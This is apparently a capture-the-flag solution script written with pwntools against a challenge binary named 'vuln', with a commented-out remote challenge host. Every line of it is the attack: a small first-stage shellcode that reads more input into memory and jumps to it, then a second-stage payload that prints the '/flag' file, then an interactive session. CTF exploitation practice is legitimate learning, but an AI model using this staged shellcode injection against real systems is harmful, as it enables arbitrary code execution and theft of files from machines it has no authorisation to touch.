from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'info')
io = process("./vuln")

#io = remote("node5.anna.nssctf.cn", 25921)

#gdb.attach(io)
shellcode = asm('''
xor rdi, rdi;
mov rsi, rdx;
add rsi, 0x10;
syscall;
call rsi;
''')

io.sendline(shellcode)

payload = asm(shellcraft.cat('/flag'))
io.sendline(payload)

io.interactive()
